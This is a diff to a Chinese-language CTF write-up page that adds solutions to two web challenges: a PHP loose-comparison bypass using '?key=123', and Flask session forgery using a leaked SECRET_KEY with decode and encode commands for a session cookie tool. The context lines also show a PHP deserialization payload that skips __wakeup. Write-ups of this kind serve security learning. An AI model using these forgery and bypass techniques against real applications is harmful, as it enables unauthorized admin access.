@@ -176,7 +176,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-09 16:11:32" itemprop="dateModified" datetime="2021-05-09T16:11:32+08:00">2021-05-09</time>
+                <time title="修改时间：2021-05-16 23:46:02" itemprop="dateModified" datetime="2021-05-16T23:46:02+08:00">2021-05-16</time>
               </span>
 
           
@@ -307,6 +307,34 @@
 <p>所以需要跳过<code>__wakeup()</code>，当反序列化时，若属性个数大于真实属性个数时，则会跳过<code>__wakeup()</code>，所以:</p>
 <p><code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p>
 <p>wakeup()是用在反序列化操作中。unserialize()会检查存在一个wakeup()方法。如果存在，则先会调用__wakeup()方法。</p>
+<h5 id="BackUpFile"><a href="#BackUpFile" class="headerlink" title="BackUpFile"></a>BackUpFile</h5><p>根据题目名提示应该是找备份文件，用dirsearch扫出<code>index.php.bak</code>文件，打开代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;key&#39;])) &#123;</span><br><span class="line">    $key &#x3D; $_GET[&#39;key&#39;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key &#x3D; intval($key);</span><br><span class="line">    $str &#x3D; &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key &#x3D;&#x3D; $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>is_numeric():检测字符串是否只由数字组成，如果字符串中只包括数字，就返回Ture，否则返回False。</p>
+<p>intval():用于获取变量的整数值。</p>
+<p>==为弱相等，也就是说12==”12” –&gt; true，而且12==”12cdf” –&gt; true，只取字符串中开头的整数部分，但是1e3dgf这样的字符串在比较时，取的是符合科学计数法的部分：1e3，也就是1000.</p>
+<p>php的弱类型特性，int型无法和str型直接比较，要将str型强制转换为int型之后再比较，在转换时只保留str型的第一个数字字符串，之后的不截取，所以只需将构建payload:<code>?key=123</code></p>
+<h5 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h5><p>首先要注册一个账号，登入之后可以在网页源码里得到提示要以管理员的身份登入，然后在更改密码的页面源码里可以找到一个GitHub链接，下载之后可以得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(&#39;header.html&#39;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line">&lt;h1 class&#x3D;&quot;nav&quot;&gt;Hello &#123;&#123; session[&#39;name&#39;] &#125;&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#39;name&#39;] &#x3D;&#x3D; &#39;admin&#39; %&#125;</span><br><span class="line">&lt;h1 class&#x3D;&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&lt;!-- you are not admin --&gt;</span><br><span class="line">&lt;h1 class&#x3D;&quot;nav&quot;&gt;Welcome to hctf&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&#123;% include(&#39;footer.html&#39;) %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">class Config(object):</span><br><span class="line">    SECRET_KEY &#x3D; os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</span><br><span class="line">    SQLALCHEMY_DATABASE_URI &#x3D; &#39;mysql+pymysql:&#x2F;&#x2F;root:adsl1234@db:3306&#x2F;test&#39;</span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS &#x3D; True</span><br></pre></td></tr></table></figure>
+
+<p>找到这两段代码是解题的关键，从第一段看出只要从session中得到的值<code>name</code>为admin就会显示<code>flag</code>，而第二段代码我可以可以拿到密钥SECRET_KEY为ckj123，这道题的考点就是flask session伪造</p>
+<h6 id="Flask-session-概念解释："><a href="#Flask-session-概念解释：" class="headerlink" title="Flask session 概念解释："></a>Flask session 概念解释：</h6><p>flask是非常轻量级的 Web框架 ，其 session 存储在客户端中（可以通过HTTP请求头Cookie字段的session获取），且仅对session 进行了签名，缺少数据防篡改实现，这便很容易存在安全漏洞。</p>
+<p>session 是基于cookie实现， 保存在服务端的键值对（形式为 {随机字符串：‘xxxxxx’}）, 同时在浏览器中的cookie中也对应一相同的随机字符串，用来再次请求的 时候验证。</p>
+<p>Flask中的session是存在浏览器中 默认key是session(加密的cookie)， 也可以像Django一样基于上述的方式实现保存在数据库。</p>
+<h6 id="flask-session伪造："><a href="#flask-session伪造：" class="headerlink" title="flask session伪造："></a>flask session伪造：</h6><p>知道了flask的session如果要加密或者解密需要一个<code>SECRET_KEY</code>，本题的session可以抓包获得。</p>
+<p>序列化session的主要过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1，json.dumps 将对象转换成json字符串，作为数据</span><br><span class="line">2，如果数据压缩后长度更短，则用zlib库进行压缩</span><br><span class="line">3，将数据用base64编码</span><br><span class="line">4，通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割</span><br></pre></td></tr></table></figure>
+
+<p>第4步就解决了用户篡改session的问题，因为在不知道secret_key的情况下，是无法伪造签名的。这道题的源码给出了secret_key，所以可以session伪造。</p>
+<p>可参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>
+<p>所以这道题的解题思路：找到session&gt;解密&gt;将session中得到的值<code>name</code>修改为admin&gt;将修改过后的session重新加密&gt;代替原有的session</p>
+<p>加密或解密需要用到python2或3的版本（*号代表版本，2或3），加解密脚本地址：<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a> ，安装之后需要到文件当前目录执行</p>
+<p>解密:<code>python* flask_session_manager*.py decode -s SECRET_KEY -c session</code></p>
+<p>加密:<code>python* flask_session_manager*.py encode -s SECRET_KEY -t 未加密session</code></p>
+<p>如我所的构造（解密）：python3 flask_session_manager3.py decode -s ckj123 -c <strong>.eJw9kE9rwjAYxr_KeM8eurTCEDw4UkOF9w2VZCO5SLXVpjYOqlIb8buvk-HpOfzg-XeHzb6rzjXMLt21msDGlTC7w9sWZkC8bInnCQbdU_g6Wq5j45cO_cobpQOF0llVeqkWPXHriOU3E5Y18dZZoRmGdJAqTSjoqfEmlmJVU9hFKHCw6sCoMQOF2pNPI8n1DccM4_MeFUbIdWK9TpDvBmzS3qi2Rr6YSpXHttG9FYaZQK0V67FPNofHBHbnbr- 5_Byr02sCsoxZnzGp2saMimHt7F9V_umR29qKLDZNOpCwtfxeOhqnUT5_2jlfHKqX09Z_sPyfnAo_AiiKAiZwPVfd8zV4j-DxC2jGbMw.XltvVw.hbTHaI6lG6Fn3uXRaeFlhoTtcCg</strong> 加黑部分是我的session<br>解密之后：<code>&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;47e44835075dd57bab2bfa5377be7f90046b7d1c1a49bde6312918759bf78ba7740c2e8666278f6a485135dbd0134058fe8072210a9a009947f50df6c3eddb2b&#39;, &#39;csrf_token&#39;: b&#39;3b6fb699cbb634bd6b40f06adb7b124fa9ab6bf5&#39;, &#39;image&#39;: b&#39;no6A&#39;, &#39;name&#39;: &#39;aaa&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</code></p>
+<p>然后将为aaa的name值修改为admin，再同样的方法进行加密，最后用bp放包就可以拿到flag。</p>
 
       
     </div>
